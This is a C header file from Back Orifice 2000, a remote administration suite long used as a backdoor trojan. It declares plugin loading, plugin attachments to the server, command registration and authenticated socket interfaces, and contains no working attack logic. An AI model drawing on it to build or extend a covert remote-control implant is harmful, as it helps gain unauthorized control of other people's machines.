/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This file is free software, and not subject to GNU Public License
	restrictions; you can redistribute it and/or modify it in any way 
	you see fit. This file is suitable for inclusion in a derivative
	work, regardless of license on the work or availability of source code
	to the work. If you redistribute this file, you must leave this
	header intact.
    
	This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_PLUGINS_H
#define __INC_PLUGINS_H

#include<bocomreg.h>
#include<auth.h>
#include<encryption.h>
#include<iohandler.h>

#ifdef __BO2KSERVER__

void InitializeCommands(void);
void TerminateCommands(void);
void LoadPlugins(void);
void UnloadPlugins(void);
int AddPlugin(void *pPlugin, int nSize);
int DebugPlugin(char *svPluginFile);
HMODULE GetPlugin(int nNum);
int RemovePlugin(int nNum);

#endif

#pragma pack(push,1)

typedef struct {
	WORD nNumPlugins;
} ATTACHMENT_HEADER, *PATTACHMENT_HEADER;

typedef struct {
	DWORD dwPluginSize;
} ATTACHMENT_INDEX, *PATTACHMENT_INDEX;

typedef int (TYPEOF_ClientMenu)(HWND hParent);
typedef int (TYPEOF_RegisterCommand)(BO_CMD_HANDLER handler, char *svFolderName, char *svCommName, char *svArgDesc1, char *svArgDesc2, char *svArgDesc3);
typedef int (TYPEOF_UnregisterCommand)(int command);
typedef int (TYPEOF_RegisterClientMenu)(LPCSTR szCategory, LPCSTR szComName, TYPEOF_ClientMenu *pProc);
typedef int (TYPEOF_UnregisterClientMenu)(LPCSTR szCategory, LPCSTR szComName);
typedef int (TYPEOF_IssueAuthCommandRequest)(CAuthSocket *cas_from, int command, int comid, int nArg1, char *svArg2, char *svArg3);
typedef int (TYPEOF_IssueAuthCommandReply)(CAuthSocket *cas_from, int comid, int nReplyCode, char *svReply);
typedef CAuthSocket *(TYPEOF_ConnectAuthSocket)(INTERACTIVE_CONNECT *pIC, int nUserId, HWND hParent, LPCSTR svBindStr, LPCSTR svNetMod, LPCSTR svEncryption, LPCSTR svAuth);
typedef CAuthSocket *(TYPEOF_ListenAuthSocket)(INTERACTIVE_LISTEN *pIL, int nUserId, HWND hParent, LPCSTR svBindStr, LPCSTR svNetMod, LPCSTR svEncryption, LPCSTR svAuth);
typedef int (TYPEOF_DispatchCommand)(int command, CAuthSocket *cas_from, int comid, int nArg1, char *svArg2, char *svArg3);
typedef INTERACTIVE_LISTEN TYPEOF_InteractiveListen; 
typedef INTERACTIVE_CONNECT TYPEOF_InteractiveConnect;


typedef struct {
	CEncryptionHandler				*pEncryptionHandler;
	CIOHandler						*pIOHandler;
	CAuthHandler					*pAuthHandler;
	TYPEOF_RegisterCommand			*pRegisterCommand;
	TYPEOF_UnregisterCommand		*pUnregisterCommand;
	TYPEOF_RegisterClientMenu		*pRegisterClientMenu;
	TYPEOF_UnregisterClientMenu		*pUnregisterClientMenu;
	TYPEOF_DispatchCommand			*pDispatchCommand;
	TYPEOF_IssueAuthCommandRequest	*pIssueAuthCommandRequest;
	TYPEOF_IssueAuthCommandReply	*pIssueAuthCommandReply;
	TYPEOF_ConnectAuthSocket		*pConnectAuthSocket;
	TYPEOF_ListenAuthSocket			*pListenAuthSocket;
	TYPEOF_InteractiveListen		*pInteractiveListen;
	TYPEOF_InteractiveConnect		*pInteractiveConnect;
} PLUGIN_LINKAGE;

typedef struct {
	char *svFilename;
	char *svDescription;
	WORD wVersionLo;
	WORD wVersionHi;
	WORD wBOVersionLo;
	WORD wBOVersionHi;
} PLUGIN_VERSION;

typedef BOOL (TYPEOF_InstallPlugin)(PLUGIN_LINKAGE pl);
typedef BOOL (TYPEOF_PluginVersion)(PLUGIN_VERSION *ppv);
typedef void (TYPEOF_TerminatePlugin)(void);

#define WM_CHILD_DESTROYED (WM_USER+1)

#pragma pack(pop)

#endif